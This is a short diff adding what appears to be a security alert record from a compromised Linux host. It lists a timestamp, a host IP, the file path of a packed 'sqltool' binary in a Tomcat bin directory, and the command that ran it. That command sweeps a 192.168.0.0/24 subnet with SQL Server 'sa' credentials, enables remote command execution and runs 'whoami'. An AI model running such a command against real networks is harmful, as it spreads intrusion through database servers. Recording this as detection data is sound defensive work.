@@ -1,0 +1,9 @@
+[occurTime]
+2022-03-25 15:16:47
+2022-03-25 15:16:47
+[hostIp]
+192.168.0.155
+[pCommand]
+./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami
+[pFilePath]
+/usr/tomcat/apache-tomcat-8.5.76/bin/sqltool_amd64_upx
